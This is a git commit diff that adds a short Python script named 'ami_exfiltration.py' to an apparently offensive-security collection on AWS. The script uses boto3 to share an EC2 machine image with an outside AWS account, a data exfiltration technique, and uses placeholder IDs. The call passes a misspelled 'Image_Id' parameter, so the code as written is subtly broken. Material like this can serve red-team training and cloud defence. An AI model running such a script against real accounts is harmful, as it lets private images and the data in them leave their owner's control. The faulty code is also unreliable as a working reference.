fc26303252c1636586b5d1857585e3c48a308db7
NextGenSec <142174128+NextGenSec-Github@users.noreply.github.com>
2024-04-05 22:53:37 +0500

    Update ami_exfiltration.py

--- aws/Offensive Security on AWS/Scripts/ami_exfiltration.py
+++ aws/Offensive Security on AWS/Scripts/ami_exfiltration.py
@@ -1,3 +1,23 @@
 import boto3
 
-ec2_client = boto3.client(''
+# Create the EC2 Client
+ec2_client = boto3.client('ec2')
+
+# Define the AMI ID
+ami_id = 'ami-12345...'
+
+# Define the AWS Account to share the AMI with
+account_id = '123456789'
+
+# Share the AMI with the external AWS Account
+ec2_client.modify_image_attribute(
+  Image_Id=ami_id,
+  LaunchPermission={
+  'Add': [{'UserId': account_id}]
+  }
+
+
+)
+
+
+
